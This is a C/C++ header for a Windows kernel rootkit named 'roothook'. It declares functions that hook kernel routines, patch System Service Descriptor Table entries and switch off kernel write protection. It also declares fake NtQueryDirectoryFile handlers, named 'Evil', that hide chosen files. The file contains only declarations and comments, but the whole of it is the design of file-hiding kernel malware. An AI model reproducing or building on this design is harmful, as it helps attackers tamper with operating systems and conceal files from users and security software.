#pragma once
#include "requests.h"


// Memory functions pool structure is 'Hk..'
namespace roothook {
	NTSTATUS SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag);  // Hook to a function from the windows 10 kernel / from a driver
	NTSTATUS HookHandler(PVOID hookedf_params);  // Handles the hooking to another kernel function of the wanted external function
	namespace SSDT {
		ULONG GetSystemCallIndex(PUNICODE_STRING SystemServiceName);  // Get the index of a system service in the SSDT with its name
		KIRQL DisableWriteProtection();   // Disable write protection to be able to write (like in an SSDT hook)
		void EnableWriteProtection(KIRQL CurrentIRQL);  // Enable write protection like normal. IRQL provided for operation
		ULONG64 CurrentSSDTFuncAddr(ULONG SyscallNumber);  // Get the address of the current function signed as the system service at syscall number SyscallNumber
		ULONG64 GetServiceDescriptorTable();  // Get the base address of the actual SSDT in memory
		ULONG GetOffsetFromSSDTBase(ULONG64 FunctionAddress);  // Get the offset of a function/address from the base of the SSDT table (used to calculate entry value)
		NTSTATUS SystemServiceDTHook(PVOID HookingFunction, ULONG Tag);  // Perform an SSDT hook
		NTSTATUS SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber);  // Unhook the SSDT entry
	}
	NTSTATUS EvilQueryDirectoryFile(IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG Length,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN ReturnSingleEntry,
		IN PUNICODE_STRING FileName OPTIONAL,
		IN BOOLEAN RestartScan);  // Fake NtQueryDirectoryFile function to trace and hide wanted files
	NTSTATUS EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG Length,
		FILE_INFORMATION_CLASS FileInformationClass,
		IN ULONG QueryFlags,
		IN PUNICODE_STRING FileName OPTIONAL);  // Fake NtQueryDirectoryFileEx function to trace and hide wanted files
}